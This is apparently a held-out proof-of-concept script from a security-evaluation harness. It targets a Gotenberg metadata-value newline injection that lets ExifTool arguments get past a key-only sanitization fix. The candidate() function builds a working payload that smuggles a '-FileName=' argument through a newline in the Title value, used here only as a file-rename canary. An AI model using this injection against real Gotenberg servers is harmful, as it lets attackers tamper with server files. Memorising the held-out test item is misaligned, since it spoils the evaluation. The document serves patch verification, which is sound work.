#!/usr/bin/env python3
r"""HELD-OUT residual/bypass PoC for gotenberg-cve-2026-40281.

RESIDUAL CVE = CVE-2026-40281 (GHSA-q7r4-hc83-hf2q, CVSS 10.0):
  "Gotenberg has ExifTool stdin argument injection via metadata VALUE newlines
   (bypass of key sanitization fix)."
  Advisory: "This is a complete bypass of the key-sanitization fix introduced
   in v8.30.1 ... The fix validated the wrong side of the = sign."

The v8.30.1 fix (original_poc.py) only inspects the metadata KEY. The metadata
VALUE is passed unsanitized to go-exiftool's SetString(), and go-exiftool emits

    fmt.Fprintln(e.stdin, "-"+k+"="+str)

on ExifTool's line-based stdin. A newline embedded in the VALUE splits that one
line into TWO ExifTool arguments, so the second line is an attacker-controlled
pseudo-tag -- regardless of the key blocklist:

    metadata = {"Title": "x\n-FileName=/tmp/pcb_val_<flag>"}
      go-exiftool stdin ->  -Title=x
                            -FileName=/tmp/pcb_val_<flag>

ExifTool then RENAMES the PDF to the injected path.

  - v8.30.1 (V1, TARGET): no value validation -> INJECTS (rename lands).
  - v8.31.0 (V2, FIXED):  validateMetadataValue() rejects "\n\r\x00" in values
                          -> HTTP 400, no rename (BLOCKED).

BENIGN CANARY: identical to the original -- a `-FileName=<sentinel>` rename of
the uploaded temp PDF to a per-run path. No `-if`/`-exec`/shell, no real RCE.
This file lives under _heldout/ and is NOT given to the method under test.
"""
from __future__ import annotations

import json


def sentinel_path(flag: str) -> str:
    """Per-run sentinel the residual (VALUE) injection renames the PDF to."""
    return f"/tmp/pcb_val_{flag}"


def candidate(flag: str) -> dict:
    """Return the multipart 'metadata' field (JSON string) + expected sentinel.

    The JSON encodes a real newline (\\n) inside the Title value; go's
    json.Unmarshal restores it to a literal newline byte in the Go string,
    which go-exiftool then writes verbatim to ExifTool stdin.
    """
    path = sentinel_path(flag)
    metadata = json.dumps({"Title": f"x\n-FileName={path}"})
    return {"kind": "value", "metadata": metadata, "sentinel": path}
